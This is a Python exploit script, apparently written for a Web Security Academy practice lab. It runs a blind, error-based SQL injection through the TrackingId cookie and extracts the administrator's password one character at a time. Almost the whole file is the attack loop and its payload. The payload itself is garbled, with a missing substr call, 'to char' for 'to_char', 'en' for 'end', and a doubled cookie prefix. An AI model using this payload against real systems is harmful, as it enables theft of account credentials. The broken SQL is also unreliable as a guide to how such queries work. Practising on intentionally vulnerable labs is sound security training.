#!/usr/bin/python3

from pwn import *

import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, def_handler)

main_url = "http://0a4b007e0401649ac115430c007b00b9.web-security-academy.net"
characters = string.ascii_lowercase + string.digits
 #string.printable cambiar

def makeRequest():
    
    password = ""
    
    p1 = log.progress("Brute force")
    p1.status("Initiating brute-force attack")
    
    time.sleep(2)
    
    p2 = log.progress("Password")
        
    for position in range(1, 21):
        for character in characters:
            
            cookies = {
                'TrackingId': "TrackingId=c8WPLgAK19wQMrGn'||(select case when(password,%d,1)='%s' then to char(1/0) else '' en from users where username='administrator')||'" % (position, character),
                'session': 'zqRDUFxuLgZvJZXzNJG6bGulmxHMHEoc'   
            }
            
            p1.status(cookies['TrackingId'])
            
            r = requests.get(main_url, cookies=cookies)
            
            if r.status_code == 500 : # codigo de estado
                password += character
                
                p2.status(password)
                
                break

if __name__ == '__main__':
    
     makeRequest()
   


